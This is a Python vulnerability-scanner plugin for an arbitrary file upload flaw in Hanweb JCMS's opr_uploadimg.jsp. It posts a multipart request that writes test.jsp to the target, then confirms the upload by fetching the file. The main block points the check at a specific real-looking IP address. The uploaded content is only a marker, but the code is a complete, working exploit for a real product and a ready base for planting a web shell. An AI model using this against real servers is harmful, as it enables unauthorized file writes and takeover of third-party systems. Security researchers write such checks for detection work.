#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 烽火戏诸侯
#_PlugName_ = 大汉(hanweb)jcms /lm/sys/opr_uploadimg.jsp 文件上传漏洞
import re

def assign(service, arg):
    if service == "hanweb":
        return True, arg

def audit(arg):
    payload = 'sys/opr_uploadimg.jsp?action=upload&img=test.jsp'
    data="""--4e400c16cce04a9d803521e49ff67443
Content-Disposition: form-data; name="NewFile"; filename="57h9.gif"
Content-Type: image/gif

testvul

--4e400c16cce04a9d803521e49ff67443--"""

    header ='Content-Type: multipart/form-data; boundary=4e400c16cce04a9d803521e49ff67443'
    
    target = arg + payload 
    code, head, res, errcode, _ = curl.curl2(target,header=header,post=data)
    if code ==200 and '上传成功' in res:
        code1, head1, res1, errcode1, _1 = curl.curl2(arg+'images/test.jsp')
        if code1 == 200 and 'testvul' in res1:
            security_hole(target)
        

if __name__ == '__main__':
    from dummy import *
    audit(assign('hanweb', 'http://218.94.101.3:7001/lm22/')[1])